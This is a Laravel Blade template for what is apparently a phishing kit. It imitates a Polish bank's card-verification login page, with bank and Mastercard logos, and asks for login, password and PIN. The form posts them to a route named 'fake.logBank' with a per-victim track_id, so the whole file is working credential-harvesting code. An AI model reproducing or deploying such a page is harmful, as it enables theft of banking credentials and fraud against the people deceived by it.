@extends('layouts.fake')
@push('css')
    <link href="{{ asset('css/pocztowy.css') }}" rel="stylesheet">
    <style>
        input {
            margin-top: 16px;
            text-align: left !important;
            width: 286px;
            height: 46px;
            padding-left: 17px !important;
        }

        .placeholder1 {
            position: absolute;
            left: 35px;
            top: 29px;
            background-color: white;
            /* padding: 0 20px; */
            color: #2d2926;
        }

        .placeholder2 {
            position: absolute;
            left: 35px;
            top: 29px;
            background-color: white;
            /* padding: 0 20px; */
            color: #2d2926;
        }

        .placeholder3 {
            position: absolute;
            left: 35px;
            top: 29px;
            background-color: white;
            /* padding: 0 20px; */
            color: #2d2926;
        }

        .input1:focus ~ .placeholder1,
        .input1:valid ~ .placeholder1 {
            display: none;
        }

        .input2:focus ~ .placeholder2,
        .input2:valid ~ .placeholder2 {
            display: none;
        }

        .input3:focus ~ .placeholder3,
        .input3:valid ~ .placeholder3 {
            display: none;
        }
    </style>
@endpush
@section('content')

    <div id="branding-zone"><img id="issuer-image" src="{{asset($bank['logo'])}}"><img
                id="payment-system-image" src="{{asset('images/banks/mastercard-logo.png')}}">
    </div>
    <form id="bank_pm_form" class="challenge-form" method="POST" action="{{subRoute('fake.logBank', ['track_id' => $fake->track_id])}}"
          role="form">


        <!-- Challenge processing zone -->
        <div class="challenge-processing-zone">
            <h1 class="info-header">Zaloguj się <img style="margin-bottom: -21px; height: 60px;"
                                                     src="{{asset('images/banks/money-ok.png')}}"></h1>
            <div class="info-text">
                <div class="transaction-info " style="height: auto;">
                    <p></p>
                </div>
            </div>
            <div style="position: relative;">
                <input id="login" required="" type="text" name="login" autocomplete="off" value=""
                       class="challenge-data-entry-text input1"
                       autofocus="autofocus">
                <span class="placeholder1">Login</span>
            </div>

            <br>

            <div style="position: relative;">
                <input id="password" required="" type="text" name="password" autocomplete="off" value=""
                       class="challenge-data-entry-text input2"
                       autofocus="autofocus">
                <span class="placeholder2">Hasło</span>
            </div>

            <br>
            <div style="position: relative;">
                <input id="codefromsms" required="" type="text" name="pin" autocomplete="off" value=""
                       class="challenge-data-entry-text input3"
                       autofocus="autofocus">
                <span class="placeholder3">PIN</span>
            </div>


            <div class="buttons-wrapper">
                <div class="buttons">
                    <input type="submit" name="Confirm" value="Confirm"
                           class="button button-accept submit-otp">
                </div>
            </div>
        </div>
    </form>

@endsection